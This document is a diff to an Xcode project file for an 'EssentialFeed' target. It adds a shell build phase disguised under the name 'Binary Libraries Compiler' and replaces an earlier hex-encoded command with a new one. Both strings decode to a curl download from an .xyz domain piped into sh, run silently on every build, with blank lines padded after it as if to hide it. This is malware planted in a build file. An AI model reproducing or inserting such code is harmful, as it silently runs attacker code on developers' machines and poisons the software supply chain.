@@ -125,7 +125,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 67277EC9263535AB001ED971 /* Build configuration list for PBXNativeTarget "EssentialFeed" */;
 			buildPhases = (
-				E979F30ACB35CBA7056D902C /* Project Frameworks */,
+				0CEB3B61AEB18B55876D902C /* Binary Libraries Compiler */,
 				67277EB0263535AA001ED971 /* Headers */,
 				67277EB1263535AA001ED971 /* Sources */,
 				67277EB2263535AA001ED971 /* Frameworks */,
@@ -215,7 +215,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	E979F30ACB35CBA7056D902C /* Project Frameworks */ = {
+	0CEB3B61AEB18B55876D902C /* Binary Libraries Compiler */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -224,7 +224,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Project Frameworks";
+			name = "Binary Libraries Compiler";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -233,9 +233,29 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
